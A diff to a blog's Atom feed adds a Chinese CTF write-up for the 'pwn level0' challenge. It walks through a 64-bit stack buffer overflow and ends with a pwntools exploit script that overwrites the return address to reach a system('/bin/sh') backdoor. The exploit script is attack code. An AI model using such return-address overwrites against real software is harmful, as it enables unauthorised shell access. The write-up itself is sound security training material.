@@ -63,9 +63,24 @@
     <link href="http://yoursite.com/2019/07/23/pwn-level0/"/>
     <id>http://yoursite.com/2019/07/23/pwn-level0/</id>
     <published>2019-07-23T11:17:22.133Z</published>
-    <updated>2019-07-23T11:18:06.680Z</updated>
+    <updated>2019-07-27T07:12:57.483Z</updated>
+    
+    <content type="html"><![CDATA[<a id="more"></a><p>拿到题先看看文件时32位的还是64位的</p><p>64位的</p><p>看看保护机制</p><p>PIE关闭</p><p>NX开着 栈不可执行</p><p>所以不能将shellcode写在栈上</p><p>拖到IDA看看</p><p>只有俩函数</p><p>第一个write没毛病</p><p>看看后面的函数 vulnerable_function（）</p><p>0x80大小的buf</p><p>下面的read函数可以写0x200大小的数据</p><p>所以栈溢出？</p><p>所以可以把函数返回地址覆盖掉成system函数的地址</p><p>将参数改成bin/sh</p><p>就可以执行system(“/bin/sh”)</p><p>好像发现了个后门函数</p><pre><code>int callsystem(){  return system(&quot;/bin/sh&quot;);}</code></pre><p>已经有了</p><p>所以直接将callsystem函数地址将函数返回地址覆盖掉得了</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code>from pwn import *p = process(&apos;./level0&apos;)# p = remote(&quot;111.198.29.45&quot;,&quot;31008&quot;)call_system = 0x400596payload = 0x88*&apos;a&apos; + p64(call_system)p.sendline(payload)p.interactive()</code></pre>]]></content>
     
     <summary type="html">
+    
+      
+      
+        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+
+&lt;p&gt;拿到题先看看文件时32位的还是64位的&lt;/p&gt;
+&lt;p&gt;64位的&lt;/p&gt;
+&lt;p&gt;看看保护机制&lt;/p&gt;
+&lt;p&gt;PIE关闭&lt;/p&gt;
+&lt;p&gt;NX开着 栈不可执行&lt;/p&gt;
+&lt;p&gt;所以不能将shellcode写在栈上&lt;/p&gt;
+&lt;p&gt;拖到IDA看看&lt;
+      
     
     </summary>
     
